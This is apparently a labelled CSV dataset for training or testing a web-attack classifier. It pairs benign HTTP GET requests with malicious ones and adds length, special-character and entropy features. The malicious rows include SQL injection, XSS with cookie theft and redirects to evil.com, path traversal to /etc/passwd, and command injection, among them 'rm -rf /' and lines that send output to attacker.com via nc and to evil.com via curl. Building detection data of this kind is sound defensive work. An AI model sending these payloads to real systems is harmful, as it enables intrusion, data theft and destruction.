payload,label,length,special_ratio,entropy
GET /api/user?user=' OR '1'='1' -- HTTP/1.1,1,43.0,0.11627906976744186,4.200007639511387
GET /api/products?q=search+term&limit=10 HTTP/1.1,0,49.0,0.02040816326530612,4.705948109156417
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /post?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,73.0,0.0821917808219178,4.7275633481374975
GET /about.html?page=1&category=electronics HTTP/1.1,0,52.0,0.019230769230769232,4.666315919856144
GET /comment?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.874614690921527
GET /run?cmd=hostname; rm -rf / HTTP/1.1,1,40.0,0.025,4.456198332810094
GET /blog?id=123&limit=10&sort=name HTTP/1.1,0,44.0,0.045454545454545456,4.635234743489787
GET /image?file=..;/..;/..;/etc/passwd HTTP/1.1,1,47.0,0.06382978723404255,4.290207533268688
GET /contact.html?id=123&price=100 HTTP/1.1,0,43.0,0.023255813953488372,4.629412138272088
GET /blog?page=1&color=blue HTTP/1.1,0,36.0,0.027777777777777776,4.30827083453526
GET /register?size=medium&category=electronics HTTP/1.1,0,55.0,0.01818181818181818,4.532795450559983
GET /image?file=..//..//..//etc/passwd HTTP/1.1,1,47.0,0.0,4.114363650151871
GET /contact.html?category=electronics&page=1&filter=active HTTP/1.1,0,68.0,0.029411764705882353,4.558709209217967
GET /login?filter=active&size=medium HTTP/1.1,0,45.0,0.022222222222222223,4.6393080301830025
GET /register?category=electronics&id=123&sort=name HTTP/1.1,0,60.0,0.03333333333333333,4.566830129043384
GET /index.html?page=1 HTTP/1.1,0,31.0,0.0,4.389364858634393
GET /api/products?q=search+term&filter=active&category=electronics HTTP/1.1,0,75.0,0.02666666666666667,4.682748730786531
GET /dashboard?color=blue&limit=10 HTTP/1.1,0,43.0,0.023255813953488372,4.611856614965961
GET /profile?page=1&limit=10 HTTP/1.1,0,37.0,0.02702702702702703,4.411891879025521
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
"GET /api/user?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,70.0,0.07142857142857142,4.9628724384914715
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /login?id=123&page=1 HTTP/1.1,0,33.0,0.030303030303030304,4.35485207383835
GET /login?user=1' AND '1'='2 HTTP/1.1,1,38.0,0.10526315789473684,4.385956789702442
GET /about.html?sort=name&q=search+term HTTP/1.1,0,48.0,0.020833333333333332,4.589661719245796
GET /search?color=blue HTTP/1.1,0,31.0,0.0,4.284683810317086
GET /post?q=%3Ckeygen onfocus=alert(1) autofocus%3E HTTP/1.1,1,60.0,0.03333333333333333,4.8045745041515575
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /document?file=../../../../../../etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /api/user?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,59.0,0.0,4.25765486324443
GET /register?q=search+term HTTP/1.1,0,36.0,0.0,4.315622570826659
GET /index.html?category=electronics&limit=10 HTTP/1.1,0,54.0,0.018518518518518517,4.6619328723735824
GET /settings?size=medium&price=100&filter=active HTTP/1.1,0,58.0,0.034482758620689655,4.6159275465533005
GET /download?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /login?user='; DROP TABLE users-- HTTP/1.1,1,46.0,0.043478260869565216,4.6460722174352656
GET /about.html?price=100 HTTP/1.1,0,34.0,0.0,4.513645929358369
GET /file?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,58.0,0.0,4.27538703061342
GET /settings?limit=10&color=blue&category=electronics HTTP/1.1,0,63.0,0.031746031746031744,4.564681217790536
GET /about.html?color=blue&sort=name&limit=10 HTTP/1.1,0,54.0,0.037037037037037035,4.587858798299509
GET /api/users?id=123 HTTP/1.1,0,30.0,0.0,4.231401845392171
GET /profile?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.825553479199118
GET /search?sort=name HTTP/1.1,0,30.0,0.0,4.281727678869737
GET /login?page=1&q=search+term&size=medium HTTP/1.1,0,52.0,0.038461538461538464,4.75074591073236
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /products.html?limit=10&q=search+term HTTP/1.1,0,50.0,0.02,4.703465189601647
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /api/products?price=100 HTTP/1.1,0,36.0,0.0,4.363826390090815
GET /register?category=electronics&filter=active&color=blue HTTP/1.1,0,68.0,0.029411764705882353,4.46630356246317
GET /settings?sort=name HTTP/1.1,0,32.0,0.0,4.241729296672174
GET /blog?limit=10 HTTP/1.1,0,27.0,0.0,4.106377316818028
GET /profile?sort=name&price=100 HTTP/1.1,0,41.0,0.024390243902439025,4.552197126358233
GET /search?filter=active&price=100 HTTP/1.1,0,44.0,0.022727272727272728,4.464558038845993
GET /api/user?user=1%27%20ORDER%20BY%2010-- HTTP/1.1,1,52.0,0.0,4.59448250651942
GET /profile?user=admin'/* HTTP/1.1,1,35.0,0.02857142857142857,4.571860873964194
GET /products.html?limit=10&category=electronics HTTP/1.1,0,57.0,0.017543859649122806,4.694401365224721
GET /register?id=123&filter=active HTTP/1.1,0,43.0,0.023255813953488372,4.472321731245031
GET /api/products?limit=10&q=search+term HTTP/1.1,0,49.0,0.02040816326530612,4.705948109156417
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /exec?cmd=hostname; ls -la HTTP/1.1,1,39.0,0.02564102564102564,4.477459270033353
GET /dashboard?category=electronics&filter=active&price=100 HTTP/1.1,0,68.0,0.029411764705882353,4.679395106517187
GET /profile?user=1%27%20AND%20%271%27=%271 HTTP/1.1,1,52.0,0.0,4.404592064578513
GET /settings?color=blue HTTP/1.1,0,33.0,0.0,4.4154581344444095
GET /api/user?user=' OR '1'='1' -- HTTP/1.1,1,43.0,0.11627906976744186,4.200007639511387
GET /about.html?q=search+term&id=123&sort=name HTTP/1.1,0,55.0,0.03636363636363636,4.776192213249308
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?filter=active&limit=10&page=1 HTTP/1.1,0,51.0,0.0392156862745098,4.483617685440307
GET /ping?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,53.0,0.018867924528301886,4.569730303898026
GET /blog?id=123&category=electronics HTTP/1.1,0,46.0,0.021739130434782608,4.658900271039244
GET /settings?color=blue&sort=name HTTP/1.1,0,43.0,0.023255813953488372,4.547789463752856
GET /search?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,59.0,0.1016949152542373,4.848851211061991
GET /api/products?category=electronics&sort=name&color=blue HTTP/1.1,0,68.0,0.029411764705882353,4.6041095847706615
GET /comment?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1,1,71.0,0.028169014084507043,4.773006190464478
GET /settings?page=1&filter=active&price=100 HTTP/1.1,0,53.0,0.03773584905660377,4.49925223798275
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /download?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.335337750470313
GET /login?size=medium HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /command?cmd=hostname& cat /etc/passwd HTTP/1.1,1,51.0,0.0196078431372549,4.358316518272401
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /search?user=1' ORDER BY 1-- HTTP/1.1,1,41.0,0.024390243902439025,4.421831810066857
GET /api/users?filter=active&q=search+term&size=medium HTTP/1.1,0,63.0,0.031746031746031744,4.61552674982022
GET /download?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /products.html?id=123 HTTP/1.1,0,34.0,0.0,4.51364592935837
GET /about.html?sort=name&page=1 HTTP/1.1,0,41.0,0.024390243902439025,4.552197126358233
GET /index.html?sort=name HTTP/1.1,0,34.0,0.0,4.477024973539649
GET /profile?size=medium&color=blue HTTP/1.1,0,44.0,0.022727272727272728,4.527169118440618
GET /login?user=1%27%20ORDER%20BY%2010-- HTTP/1.1,1,49.0,0.0,4.660528466520034
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /products.html?color=blue&sort=name HTTP/1.1,0,48.0,0.020833333333333332,4.605388542207535
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /settings?color=blue&id=123&q=search+term HTTP/1.1,0,54.0,0.037037037037037035,4.8191592611823415
GET /about.html?category=electronics&sort=name&color=blue HTTP/1.1,0,66.0,0.030303030303030304,4.574792324514654
GET /register?q=search+term&color=blue&limit=10 HTTP/1.1,0,56.0,0.03571428571428571,4.633272672738776
GET /contact.html?category=electronics&id=123&limit=10 HTTP/1.1,0,63.0,0.031746031746031744,4.661504479220851
GET /login?color=blue&sort=name HTTP/1.1,0,40.0,0.025,4.534183719779189
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
"GET /search?user=%27%20AND%201=CONVERT(int,%20(SELECT%20@@version))-- HTTP/1.1",1,78.0,0.05128205128205128,5.107857713324245
GET /file?file=../../../../../../etc/passwd HTTP/1.1,1,52.0,0.0,3.8130394036575916
GET /document?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.415337750470313
GET /contact.html?color=blue&limit=10&category=electronics HTTP/1.1,0,67.0,0.029850746268656716,4.573353840183968
GET /dashboard?q=search+term&size=medium&color=blue HTTP/1.1,0,60.0,0.03333333333333333,4.691993045782167
GET /profile?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,58.0,0.0,4.32143934894199
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /api/products?filter=active HTTP/1.1,0,40.0,0.0,4.496439344671015
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /dashboard?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /login?user=1%27%20AND%20%271%27=%271 HTTP/1.1,1,50.0,0.0,4.376174630069642
GET /profile?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6710111130341945
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /index.html?q=search+term&price=100 HTTP/1.1,0,48.0,0.020833333333333332,4.704448698502606
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?user=1' ORDER BY 10-- HTTP/1.1,1,41.0,0.024390243902439025,4.5681732734814915
GET /register?limit=10&size=medium&color=blue HTTP/1.1,0,54.0,0.037037037037037035,4.53732072509209
GET /docs?color=blue&limit=10 HTTP/1.1,0,38.0,0.02631578947368421,4.4842551447948
GET /profile?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1,1,71.0,0.028169014084507043,4.811443598256035
GET /document?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.415337750470313
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /profile?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6710111130341945
GET /post?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1,1,59.0,0.03389830508474576,4.698332829346123
GET /file?file=..;/..;/..;/etc/passwd HTTP/1.1,1,46.0,0.06521739130434782,4.188215826378304
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /docs?sort=name&price=100&page=1 HTTP/1.1,0,45.0,0.044444444444444446,4.55263837396322
GET /profile?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,55.0,0.05454545454545454,4.836374832596711
GET /blog?color=blue&sort=name HTTP/1.1,0,39.0,0.02564102564102564,4.477459270033353
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,55.0,0.10909090909090909,4.803642667873433
GET /dashboard?color=blue&filter=active HTTP/1.1,0,48.0,0.020833333333333332,4.615601562950724
GET /search?user=%27;%20DROP%20TABLE%20users-- HTTP/1.1,1,55.0,0.01818181818181818,4.685638577043014
GET /api/products?q=search+term&limit=10&filter=active HTTP/1.1,0,63.0,0.031746031746031744,4.711429035216513
GET /api/user?user=' OR 'a'='a HTTP/1.1,1,39.0,0.10256410256410256,4.201692923824033
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /profile?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,76.0,0.07894736842105263,4.777891008010804
GET /search?limit=10&size=medium&filter=active HTTP/1.1,0,55.0,0.03636363636363636,4.565107840986821
GET /ping?cmd=hostname| curl http://evil.com HTTP/1.1,1,53.0,0.018867924528301886,4.72755158647539
GET /register?q=search+term HTTP/1.1,0,36.0,0.0,4.315622570826659
GET /profile?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6710111130341945
GET /login?user=%27%20OR%20%271%27=%271%27/* HTTP/1.1,1,53.0,0.0,4.3237245227222525
GET /products.html?page=1&limit=10 HTTP/1.1,0,43.0,0.023255813953488372,4.646967661578215
GET /profile?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.825553479199118
GET /post?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,51.0,0.0784313725490196,4.655282146267043
GET /api/products?price=100&filter=active HTTP/1.1,0,50.0,0.02,4.56307418942857
GET /index.html?size=medium&category=electronics HTTP/1.1,0,57.0,0.017543859649122806,4.700796592884375
GET /search?color=blue&filter=active&page=1 HTTP/1.1,0,52.0,0.038461538461538464,4.6063271606491485
GET /profile?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,58.0,0.034482758620689655,4.745406425938248
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /settings?sort=name HTTP/1.1,0,32.0,0.0,4.241729296672174
GET /api/user?user=1%27%20AND%20%271%27=%271 HTTP/1.1,1,53.0,0.0,4.329072049140224
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /post?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,51.0,0.0784313725490196,4.655282146267043
GET /file?file=..;/..;/..;/etc/passwd HTTP/1.1,1,46.0,0.06521739130434782,4.188215826378304
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /login?user=%27%20UNION%20SELECT%20NULL-- HTTP/1.1,1,54.0,0.0,4.773043983484693
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /contact.html?filter=active HTTP/1.1,0,40.0,0.0,4.393942707918268
GET /api/users?limit=10&filter=active&size=medium HTTP/1.1,0,58.0,0.034482758620689655,4.5382337978174965
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/users?page=1 HTTP/1.1,0,30.0,0.0,4.0980685120588385
GET /document?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,63.0,0.0,4.530275805107375
GET /login?user=') OR ('1'='1 HTTP/1.1,1,38.0,0.15789473684210525,4.385956789702442
GET /api/users?filter=active&category=electronics HTTP/1.1,0,58.0,0.017241379310344827,4.5385098742141095
GET /search?user=' UNION SELECT * FROM users-- HTTP/1.1,1,55.0,0.01818181818181818,4.655611586962955
GET /register?color=blue HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /profile?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.896404087557007
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /image?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,52.0,0.0,4.4473385747039735
GET /ping?cmd=hostname; ls -la HTTP/1.1,1,39.0,0.02564102564102564,4.599379462396518
GET /products.html?limit=10 HTTP/1.1,0,36.0,0.0,4.440351042928688
GET /about.html?price=100&limit=10 HTTP/1.1,0,43.0,0.023255813953488372,4.518833359152008
GET /docs?limit=10&color=blue HTTP/1.1,0,38.0,0.02631578947368421,4.4842551447948
GET /contact.html?id=123 HTTP/1.1,0,33.0,0.0,4.369707376737534
GET /products.html?price=100 HTTP/1.1,0,37.0,0.0,4.519999987133628
GET /contact.html?price=100&limit=10 HTTP/1.1,0,45.0,0.022222222222222223,4.446974207248478
GET /document?file=../../../../../../etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /api/user?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,51.0,0.0,4.313911371086314
GET /api/products?sort=name&id=123 HTTP/1.1,0,43.0,0.023255813953488372,4.629412138272087
GET /dashboard?price=100&sort=name&color=blue HTTP/1.1,0,54.0,0.037037037037037035,4.684990511222407
GET /search?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,59.0,0.1016949152542373,4.848851211061991
GET /docs?id=123&filter=active HTTP/1.1,0,39.0,0.02564102564102564,4.560667282798391
GET /api/user?user=1%27%20ORDER%20BY%201-- HTTP/1.1,1,51.0,0.0,4.6084123516481545
GET /ping?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.624315456095191
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /about.html?price=100&category=electronics&id=123 HTTP/1.1,0,62.0,0.03225806451612903,4.828802156986593
GET /products.html?page=1&limit=10&size=medium HTTP/1.1,0,55.0,0.03636363636363636,4.671913349730952
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /search?q=%3Cimg src=x onerror=alert('XSS')%3E HTTP/1.1,1,59.0,0.06779661016949153,4.869516989856459
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /dashboard?filter=active HTTP/1.1,0,37.0,0.0,4.5199999871336285
GET /contact.html?size=medium&sort=name&id=123 HTTP/1.1,0,55.0,0.03636363636363636,4.6945517587825245
GET /login?user=' OR '1'='1' -- HTTP/1.1,1,40.0,0.125,4.272573883611434
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /blog?q=search+term&id=123 HTTP/1.1,0,39.0,0.02564102564102564,4.785151577725659
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /products.html?sort=name&color=blue HTTP/1.1,0,48.0,0.020833333333333332,4.605388542207535
GET /about.html?color=blue&limit=10&sort=name HTTP/1.1,0,54.0,0.037037037037037035,4.587858798299508
GET /blog?limit=10&page=1 HTTP/1.1,0,34.0,0.029411764705882353,4.359377914716119
GET /api/users?price=100&sort=name HTTP/1.1,0,43.0,0.023255813953488372,4.4837223125397525
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /about.html?price=100&page=1&sort=name HTTP/1.1,0,51.0,0.0392156862745098,4.696455979014295
GET /contact.html?color=blue HTTP/1.1,0,37.0,0.0,4.350684784255508
GET /login?user=' UNION SELECT * FROM users-- HTTP/1.1,1,54.0,0.018518518518518517,4.770419734409208
GET /search?filter=active HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /api/users?limit=10&color=blue&page=1 HTTP/1.1,0,50.0,0.04,4.593269689515109
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /contact.html?filter=active HTTP/1.1,0,40.0,0.0,4.393942707918268
GET /login?user=%27%20UNION%20SELECT%20*%20FROM%20users-- HTTP/1.1,1,66.0,0.0,4.8604703998521295
GET /api/products?category=electronics HTTP/1.1,0,47.0,0.0,4.522050021614215
GET /search?q=javascript:alert('XSS') HTTP/1.1,1,46.0,0.08695652173913043,4.751610325528165
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /dashboard?filter=active&sort=name HTTP/1.1,0,47.0,0.02127659574468085,4.639279277025428
GET /index.html?category=electronics&price=100&page=1 HTTP/1.1,0,62.0,0.03225806451612903,4.707676753691
GET /api/user?user=%27%20WAITFOR%20DELAY%20%2700:00:05%27-- HTTP/1.1,1,68.0,0.0,4.726737473412387
GET /products.html?size=medium&page=1&filter=active HTTP/1.1,0,60.0,0.03333333333333333,4.7297374208903395
GET /profile?user=' OR '1'='1 HTTP/1.1,1,38.0,0.10526315789473684,4.280693631807705
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /search?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,83.0,0.024096385542168676,4.833914094018793
GET /api/user?user='; DROP TABLE users-- HTTP/1.1,1,49.0,0.04081632653061224,4.499828405684786
GET /api/users?size=medium&limit=10 HTTP/1.1,0,44.0,0.022727272727272728,4.410818766650533
GET /post?q=<video><source onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.699833468881675
GET /index.html?id=123&sort=name HTTP/1.1,0,41.0,0.024390243902439025,4.63780139475645
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /post?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.59946860789152
GET /comment?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.868106670688481
GET /about.html?price=100&limit=10&filter=active HTTP/1.1,0,57.0,0.03508771929824561,4.587386181538584
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /settings?id=123&size=medium&filter=active HTTP/1.1,0,55.0,0.03636363636363636,4.6151967046625195
GET /post?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,51.0,0.0784313725490196,4.85850818502391
GET /register?page=1&limit=10&color=blue HTTP/1.1,0,49.0,0.04081632653061224,4.558088670425058
GET /search?user=' OR 1=1 -- HTTP/1.1,1,37.0,0.02702702702702703,4.226628285180294
GET /post?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,53.0,0.1509433962264151,4.697181011486014
GET /register?color=blue HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /settings?filter=active&category=electronics HTTP/1.1,0,57.0,0.017543859649122806,4.441938917407823
GET /products.html?price=100&id=123&q=search+term HTTP/1.1,0,58.0,0.034482758620689655,4.792904486320375
